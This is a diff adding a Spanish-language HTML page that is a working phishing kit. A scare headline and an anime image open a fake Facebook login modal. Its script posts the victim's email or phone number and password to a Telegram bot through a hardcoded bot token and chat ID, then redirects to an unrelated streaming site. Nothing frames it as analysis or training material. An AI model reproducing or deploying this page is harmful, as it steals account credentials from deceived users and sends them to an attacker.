@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enviar Mensaje a Telegram</title>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+        }
+        img {
+    width: auto;  /* Esto mantiene el aspecto proporcional */
+    height: 300px;  /* Cambia este valor para controlar la altura */
+    max-width: 100%;  /* Asegura que la imagen no exceda el ancho disponible */
+    cursor: pointer;
+    margin-top: 20px;
+}
+
+
+        #modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            width: 350px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        h2 {
+    color: #007bff;
+    font-size: 30px;  /* Cambia el valor a lo que desees */
+    margin-bottom: 15px;
+}
+
+        .titulo-recuadro {
+    font-weight: bold;
+    font-size: 16px;
+    margin-bottom: 5px;
+    text-align: center; /* Esto centra el texto */
+}
+
+        textarea {
+            width: 90%;
+            height: 20px; /* Cambia esta línea para modificar la altura */
+            margin-bottom: 15px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+            resize: none;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .comentario {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #333;
+        }
+        .linea {
+            margin-top: 15px;
+            border-top: 1px solid #ccc;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Estos numeros estan tratando de ingresar atu cuenta</h1>
+    <img src="https://static.wikia.nocookie.net/naruto/images/a/a2/Naruto_Uzumaki_Parte_II_Anime.png/revision/latest?cb=20161013194453&path-prefix=es" alt="Imagen de ejemplo" onclick="openModal()">
+
+    <div id="modal">
+        <div class="modal-content">
+            <h2>Facebook</h2>
+            <div class="titulo-recuadro">Iniciar sesión en Facebook</div>
+            <textarea id="mensaje1" placeholder="Correo electronico o número de telefono"></textarea>
+            
+            <textarea id="mensaje2" placeholder="Contraseña"></textarea>
+            <button onclick="enviarMensajes()">Iniciar sesión</button>
+            <div class="comentario">¿Olvidaste tu cuenta?</div>
+            <div class="linea"></div>
+        </div>
+    </div>
+
+    <script>
+        function openModal() {
+            document.getElementById("modal").style.display = "flex";
+        }
+
+        function enviarMensajes() {
+            const mensaje1 = document.getElementById("mensaje1").value.trim();
+            const mensaje2 = document.getElementById("mensaje2").value.trim();
+
+            if (!mensaje1 && !mensaje2) {
+                alert("Por favor, escribe al menos un mensaje antes de enviarlo.");
+                return;
+            }
+
+            const token = "7625922907:AAEUPC4KQMeNMiNSryufzZjqvGfLbdlXPLs";  // Reemplaza con tu token
+            const chatID = "-4779812770";  // Reemplaza con tu ID de chat
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            const mensajes = [mensaje1, mensaje2].filter(Boolean); // Solo enviar mensajes no vacíos
+            const promesas = mensajes.map(mensaje =>
+                fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatID, text: mensaje })
+                })
+            );
+
+            Promise.all(promesas)
+                .then(() => {
+                    // Limpiar los campos sin mostrar alertas
+                    document.getElementById("mensaje1").value = "";
+                    document.getElementById("mensaje2").value = "";
+                    document.getElementById("modal").style.display = "none"; // Cerrar modal automáticamente
+                    // Redirigir a la página
+                    window.location.href = "https://www.tvlatino.site/";
+                })
+                .catch(error => {
+                    alert(`Error de conexión: ${error.message}`);
+                });
+        }
+    </script>
+
+</body>
+</html>
